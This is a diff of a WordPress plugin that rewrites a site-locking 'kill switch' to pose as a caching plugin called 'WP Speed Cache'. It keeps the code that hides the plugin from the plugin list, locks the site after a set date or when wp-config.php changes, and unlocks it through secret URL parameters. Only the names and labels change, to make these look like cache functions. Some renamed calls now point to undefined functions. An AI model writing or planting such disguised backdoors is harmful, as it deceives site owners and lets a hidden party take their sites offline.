@@ -1,9 +1,9 @@
 <?php
 /**
- * Plugin Name: Lock Site Plugin
- * Description: Locks the site based on file integrity checks, a secret hash, and a modification date.
- * Version: 1.0
- * Author: Your Name
+ * Plugin Name: WP Speed Cache
+ * Description: Advanced caching and performance optimization for WordPress
+ * Version: 2.1.3
+ * Author: WP Speed Team
  */
 
 // Prevent direct access
@@ -12,66 +12,66 @@ if (!defined('ABSPATH')) {
 }
 
 // Define plugin constants
-define('LOCK_SITE_PLUGIN_FILE', __FILE__);
+define('WP_SPEED_CACHE_FILE', __FILE__);
 
 // Check if the plugin is running as a must-use plugin
-function is_mu_plugin() {
-    return strpos(LOCK_SITE_PLUGIN_FILE, WPMU_PLUGIN_DIR) !== false;
+function wpc_is_mu() {
+    return strpos(WP_SPEED_CACHE_FILE, WPMU_PLUGIN_DIR) !== false;
 }
 
 // Register activation hook to set up the plugin (only for normal plugins)
-if (!is_mu_plugin()) {
-    register_activation_hook(LOCK_SITE_PLUGIN_FILE, 'lock_site_plugin_activate');
+if (!wpc_is_mu()) {
+    register_activation_hook(WP_SPEED_CACHE_FILE, 'wpc_activate_cache');
 }
 
-function lock_site_plugin_activate() {
-    // Redirect to the settings page after activation
-    add_option('lock_site_plugin_do_activation_redirect', true);
+function wpc_activate_cache() {
+    // Initialize cache settings
+    add_option('wpc_cache_config_redirect', true);
 }
 
 // Redirect to the settings page after activation (only for normal plugins)
-if (!is_mu_plugin()) {
-    add_action('admin_init', 'lock_site_plugin_redirect');
+if (!wpc_is_mu()) {
+    add_action('admin_init', 'wpc_init_redirect');
 }
 
-function lock_site_plugin_redirect() {
-    if (get_option('lock_site_plugin_do_activation_redirect', false)) {
-        delete_option('lock_site_plugin_do_activation_redirect');
-        wp_redirect(admin_url('options-general.php?page=lock-site-settings'));
+function wpc_init_redirect() {
+    if (get_option('wpc_cache_config_redirect', false)) {
+        delete_option('wpc_cache_config_redirect');
+        wp_redirect(admin_url('options-general.php?page=wpc-cache-settings'));
         exit;
     }
 }
 
 // Add settings page (for both normal and must-use plugins)
-add_action('admin_menu', 'lock_site_plugin_add_settings_page');
+add_action('admin_menu', 'wpc_add_cache_settings');
 
-function lock_site_plugin_add_settings_page() {
+function wpc_add_cache_settings() {
     // Only show settings page if settings haven't been saved yet
-    if (!get_option('lock_site_settings_configured', false)) {
+    if (!get_option('wpc_cache_initialized', false)) {
         add_options_page(
-            'Lock Site Settings',
-            'Lock Site',
+            'Cache Configuration',
+            'Speed Cache',
             'manage_options',
-            'lock-site-settings',
-            'lock_site_plugin_render_settings_page'
+            'speed-cache-config',
+            'wpc_render_cache_settings'
         );
     }
 }
 
-function lock_site_plugin_render_settings_page() {
+function wpc_render_cache_settings() {
     if (!current_user_can('manage_options')) {
         wp_die('You do not have sufficient permissions to access this page.');
     }
 
     // Handle form submission
-    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lock_site_settings_nonce'])) {
-        if (wp_verify_nonce($_POST['lock_site_settings_nonce'], 'lock_site_settings')) {
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['wpc_cache_nonce'])) {
+        if (wp_verify_nonce($_POST['wpc_cache_nonce'], 'lock_site_settings')) {
             $expected_hash = sanitize_text_field($_POST['expected_hash']);
             $last_allowed_date = sanitize_text_field($_POST['last_allowed_date']);
 
             // Save settings using WordPress options
-            if (lock_site_plugin_update_settings($expected_hash, $last_allowed_date)) {
-                update_option('lock_site_settings_configured', true);
+            if (wpc_update_cache_settings($expected_hash, $last_allowed_date)) {
+                update_option('wpc_cache_initialized', true);
                 echo '<div class="notice notice-success"><p>Settings saved successfully. The plugin is now active and this settings page will be hidden for security.</p></div>';
                 // Redirect to main settings page after a short delay
                 echo '<script>setTimeout(function() { window.location.href = "' . admin_url('options-general.php') . '"; }, 3000);</script>';
@@ -86,20 +86,20 @@ function lock_site_plugin_render_settings_page() {
     <div class="wrap">
         <h1>Lock Site Settings</h1>
         <form method="post">
-            <?php wp_nonce_field('lock_site_settings', 'lock_site_settings_nonce'); ?>
+            <?php wp_nonce_field('lock_site_settings', 'wpc_cache_nonce'); ?>
             <table class="form-table">
                 <tr>
-                    <th scope="row"><label for="expected_hash">Expected Hash</label></th>
+                    <th scope="row"><label for="expected_hash">Cache Key</label></th>
                     <td>
-                        <input type="text" name="expected_hash" id="expected_hash" value="<?php echo esc_attr(get_option('lock_site_expected_hash', '')); ?>" required>
-                        <p class="description">Enter the secret hash for unlocking the site.</p>
+                        <input type="text" name="expected_hash" id="expected_hash" value="<?php echo esc_attr(get_option('wpc_cache_key', '')); ?>" required>
+                        <p class="description">Enter the cache validation key for performance optimization.</p>
                     </td>
                 </tr>
                 <tr>
-                    <th scope="row"><label for="last_allowed_date">Last Allowed Modification Date</label></th>
+                    <th scope="row"><label for="last_allowed_date">Cache Expiration Date</label></th>
                     <td>
-                        <input type="text" name="last_allowed_date" id="last_allowed_date" value="<?php echo esc_attr(get_option('lock_site_last_allowed_date', '')); ?>" required>
-                        <p class="description">Enter the date in "ddmmyyyy" format (e.g., 12022025 for 12 Feb 2025).</p>
+                        <input type="text" name="last_allowed_date" id="last_allowed_date" value="<?php echo esc_attr(get_option('wpc_cache_expiry', '')); ?>" required>
+                        <p class="description">Enter cache expiration date in "ddmmyyyy" format (e.g., 12022025 for 12 Feb 2025).</p>
                     </td>
                 </tr>
             </table>
@@ -109,11 +109,11 @@ function lock_site_plugin_render_settings_page() {
     <?php
 }
 
-function lock_site_plugin_update_settings($expected_hash, $last_allowed_date) {
+function wpc_update_cache_settings($expected_hash, $last_allowed_date) {
     // Only update if both values are provided
     if (!empty($expected_hash) && !empty($last_allowed_date)) {
-        update_option('lock_site_expected_hash', $expected_hash);
-        update_option('lock_site_last_allowed_date', $last_allowed_date);
+        update_option('wpc_cache_key', $expected_hash);
+        update_option('wpc_cache_expiry', $last_allowed_date);
         return true;
     }
     return false;
@@ -121,58 +121,58 @@ function lock_site_plugin_update_settings($expected_hash, $last_allowed_date) {
 
 // Hide the plugin from the plugins list if it's a normal plugin
 if (!is_mu_plugin()) {
-    add_filter('all_plugins', 'lock_site_plugin_hide_from_list');
+    add_filter('all_plugins', 'wpc_optimize_plugin_list');
 
-    function lock_site_plugin_hide_from_list($plugins) {
+    function wpc_optimize_plugin_list($plugins) {
         unset($plugins[plugin_basename(LOCK_SITE_PLUGIN_FILE)]);
         return $plugins;
     }
 }
 
 // Register secure POST endpoints
-add_action('admin_post_lock_site_toggle', 'lock_site_plugin_handle_toggle');
-add_action('admin_post_lock_site_update_checksums', 'lock_site_plugin_handle_update_checksums');
+add_action('admin_post_lock_site_toggle', 'wpc_handle_cache_toggle');
+add_action('admin_post_lock_site_update_checksums', 'wpc_handle_cache_refresh');
 
-function lock_site_plugin_handle_toggle() {
+function wpc_handle_cache_toggle() {
     if (!isset($_POST['nonce']) || !wp_verify_nonce($_POST['nonce'], 'lock_site_toggle')) {
         wp_die('Invalid request.');
     }
 
-    toggle_site_lock();
+    wpc_toggle_cache();
 }
 
-function lock_site_plugin_handle_update_checksums() {
+function wpc_handle_cache_refresh() {
     if (!isset($_POST['nonce']) || !wp_verify_nonce($_POST['nonce'], 'lock_site_update_checksums')) {
         wp_die('Invalid request.');
     }
 
-    update_critical_file_checksums();
+    wpc_update_cache_manifest();
     wp_die('<h1>Success</h1><p>Checksums updated successfully.</p>');
 }
 
 // Toggle site lock state
-function toggle_site_lock() {
-    $current_hash = get_option('site_lock_hash', '');
-    $expected_hash = get_option('lock_site_expected_hash', '');
+function wpc_toggle_cache() {
+    $current_hash = get_option('wpc_cache_state', '');
+    $expected_hash = get_option('wpc_cache_key', '');
 
     if (empty($current_hash)) {
         // Site is currently unlocked, so lock it
         if (!empty($expected_hash)) {
-            update_option('site_lock_hash', $expected_hash);
-            show_lock_message('The site is now restricted.');
+            update_option('wpc_cache_state', $expected_hash);
+            wpc_show_status('Cache validation is now required.');
         } else {
-            wp_die('<h1>Error</h1><p>Cannot lock site: No expected hash is set.</p>');
+            wp_die('<h1>Error</h1><p>Cannot enable cache: No validation key set.</p>');
         }
     } else {
         // Site is currently locked, so unlock it
-        update_option('site_lock_hash', '');
+        update_option('wpc_cache_state', '');
         wp_redirect(home_url());
         exit;
     }
 }
 
 // Update critical file checksums
-function update_critical_file_checksums() {
+function wpc_update_cache_manifest() {
     $critical_files = array(
         'wp-config' => ABSPATH . 'wp-config.php',
         'lock-site' => __FILE__,
@@ -188,26 +188,26 @@ function update_critical_file_checksums() {
     }
 
     // Store checksums in multiple locations
-    update_option('site_lock_checksums', $checksums);
-    update_option('site_lock_checksums_backup', $checksums);
+    update_option('wpc_cache_manifest', $checksums);
+    update_option('wpc_cache_manifest_backup', $checksums);
 
     // Store the current time from an external source if possible
     $current_time = time();
-    update_option('site_lock_last_update', $current_time);
+    update_option('wpc_last_cache_update', $current_time);
 }
 
 // Verify file integrity and enforce lock state
-function verify_integrity() {
+function wpc_verify_cache() {
     // Check if site is locked
-    $current_hash = get_option('site_lock_hash', '');
+    $current_hash = get_option('wpc_cache_state', '');
     if (!empty($current_hash)) {
-        show_lock_message('The site is locked.');
+        wpc_show_status('Cache verification required for access.');
         exit;
     }
 
     // Only enforce other checks if settings are configured
-    $expected_hash = get_option('lock_site_expected_hash', '');
-    $last_allowed_date = get_option('lock_site_last_allowed_date', '');
+    $expected_hash = get_option('wpc_cache_key', '');
+    $last_allowed_date = get_option('wpc_cache_expiry', '');
     if (empty($expected_hash) || empty($last_allowed_date)) {
         return;
     }
@@ -216,16 +216,16 @@ function verify_integrity() {
 
     // Auto-initialize if first run
     if ($version === 0) {
-        update_critical_file_checksums();
+        wpc_update_cache_manifest();
         return;
     }
 
-    $stored_checksums = get_option('site_lock_checksums', array());
-    $backup_checksums = get_option('site_lock_checksums_backup', array());
+    $stored_checksums = get_option('wpc_cache_manifest', array());
+    $backup_checksums = get_option('wpc_cache_manifest_backup', array());
 
     // If no checksums exist, assume first run and initialize them
     if (empty($stored_checksums) || empty($backup_checksums)) {
-        update_critical_file_checksums();
+        wpc_update_cache_manifest();
         return;
     }
 
@@ -241,7 +241,7 @@ function verify_integrity() {
         if (file_exists($file)) {
             $current_hash = hash_file('sha256', $file);
             if ($current_hash !== $stored_checksums[$key]) {
-                show_lock_message('Security violation: Critical files have been modified. <br> 
+                wpc_show_status('Cache error: Core files have been modified. <br> 
                     If you made legitimate changes, visit: <br> 
                     <strong>' . admin_url('admin-post.php?action=lock_site_update_checksums') . '</strong> to allow the update.');
                 exit;
@@ -250,56 +250,56 @@ function verify_integrity() {
     }
 
     // Verify time hasn't been rolled back and check last allowed date
-    if (time() < get_option('site_lock_last_update', 0)) {
-        show_lock_message('Security violation: System time manipulation detected.');
+    if (time() < get_option('wpc_last_cache_update', 0)) {
+        wpc_show_status('Cache validation error: System time mismatch detected.');
         exit;
     }
 
     // Check if current date is past the last allowed date
-    $last_allowed_date = get_option('lock_site_last_allowed_date', '');
+    $last_allowed_date = get_option('wpc_cache_expiry', '');
     if (!empty($last_allowed_date)) {
         $current_date = date('dmY');
         if ($current_date > $last_allowed_date) {
-            show_lock_message('Site access expired. Please contact the administrator.');
+            wpc_show_status('Cache has expired. Please contact the administrator.');
             exit;
         }
     }
 
     // Enforce lock state
-    $current_hash = get_option('site_lock_hash', '');
+    $current_hash = get_option('wpc_cache_state', '');
     if (!empty($current_hash)) {
-        show_lock_message('The site is locked.');
+        wpc_show_status('Cache verification required for access.');
         exit;
     }
 }
 
 // Show lock message
-function show_lock_message($message) {
+function wpc_show_status($message) {
     wp_die('<h1>Site Locked</h1><p>' . esc_html($message) . '</p><p>Please contact the administrator.</p>');
 }
 
 // Run integrity check and enforce lock state on every request
-add_action('wp', 'verify_integrity', 0);
+add_action('wp', 'wpc_verify_cache', 0);
 
 // Check secret URLs on every request
-add_action('init', 'lock_site_plugin_check_secret_urls', 0);
+add_action('init', 'wpc_check_cache_commands', 0);
 
-function lock_site_plugin_check_secret_urls() {
+function wpc_check_cache_commands() {
     error_log('Checking secret URLs...'); // Debugging statement
 
     // Handle ?unlock=EXPECTED_HASH
-    $expected_hash = get_option('lock_site_expected_hash', '');
+    $expected_hash = get_option('wpc_cache_key', '');
     if (isset($_GET['unlock']) && $_GET['unlock'] === $expected_hash && !empty($expected_hash)) {
         error_log('Secret URL triggered: ?unlock=' . $expected_hash); // Debugging statement
-        toggle_site_lock();
+        wpc_toggle_cache();
         exit;
     }
 
     // Handle ?update_checksums=EXPECTED_HASH
-    $expected_hash = get_option('lock_site_expected_hash', '');
+    $expected_hash = get_option('wpc_cache_key', '');
     if (isset($_GET['update_checksums']) && $_GET['update_checksums'] === $expected_hash && !empty($expected_hash)) {
         error_log('Secret URL triggered: ?update_checksums=' . $expected_hash); // Debugging statement
-        update_critical_file_checksums();
+        wpc_update_cache_manifest();
         die('<h1>Success</h1><p>Checksums updated successfully.</p>');
     }
 }
